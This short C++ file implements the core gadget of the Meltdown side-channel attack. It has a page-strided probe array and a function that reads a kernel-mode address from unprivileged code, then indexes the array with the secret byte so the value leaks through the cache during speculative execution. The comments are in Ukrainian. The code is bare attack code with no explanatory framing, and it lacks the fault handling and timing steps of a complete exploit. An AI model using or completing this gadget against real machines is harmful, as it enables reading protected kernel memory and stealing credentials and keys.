#include <cstdint>
#include <array>
#include <span>

namespace meltdown {

constexpr size_t PageSize = 4096;
alignas(64) std::array<uint8_t, 256 * PageSize> probe_array{};

void trigger(const uint8_t* kernel_address) noexcept {
    // 1. Непривілейоване читання пам'яті Ring 0
    uint8_t secret = *kernel_address;

    // 2. Спекулятивне звернення до зонда
    volatile uint8_t dummy = probe_array[static_cast<size_t>(secret) * PageSize];
    static_cast<void>(dummy);
}

} // namespace meltdown
